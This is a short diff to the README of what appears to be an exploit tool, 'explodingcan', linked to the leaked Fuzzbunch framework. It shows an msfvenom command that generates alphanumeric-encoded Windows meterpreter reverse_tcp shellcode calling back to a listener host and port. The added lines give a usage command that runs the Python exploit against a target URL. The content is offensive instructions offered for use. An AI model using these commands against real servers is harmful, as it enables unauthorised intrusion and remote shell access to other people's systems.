@@ -23,6 +23,11 @@ The shellcode must be in alphanumeric format due to the limitations of the bug. 
 $ msfvenom -p windows/meterpreter/reverse_tcp -f raw -v sc -e x86/alpha_mixed LHOST=172.16.20.1 LPORT=4444 >shellcode
 ```
 
+## How To Use
+
+```
+python3 explodingcanPy3.py http://<target>
+```
 ## Links
 
 * [Fuzzbunch framework](https://github.com/x0rz/EQGRP_Lost_in_Translation)
